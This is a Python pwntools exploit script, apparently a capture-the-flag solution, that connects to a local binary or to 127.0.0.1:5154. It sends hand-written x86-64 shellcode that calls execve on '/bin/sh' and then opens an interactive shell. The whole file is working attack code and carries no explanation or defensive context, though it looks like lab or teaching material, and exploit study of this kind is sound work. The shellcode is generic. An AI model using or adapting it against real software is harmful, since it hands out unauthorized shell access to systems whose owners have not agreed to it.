#!/usr/bin/env python3

from pwn import *

exe = ELF("./main")

context.binary = exe
context.terminal = ["tmux", "splitw", "-h"]

def conn():
    if args.LOCAL:
        r = process([exe.path])
        #gdb.attach(r)
    else:
        r = remote("127.0.0.1", 5154)

    return r


def main():
    r = conn()

    shellcode = asm('''
    mov    rsi, 0x68732f6e69622f
    push   rsi
    mov    rdi, rsp
    xor    rdx, rdx
    push   rdx
    push   rdi
    mov    rsi, rsp
    mov    rax, 59
    syscall
    ''')
    
    r.sendlineafter(b': ', shellcode)

    r.interactive()


if __name__ == "__main__":
    main()
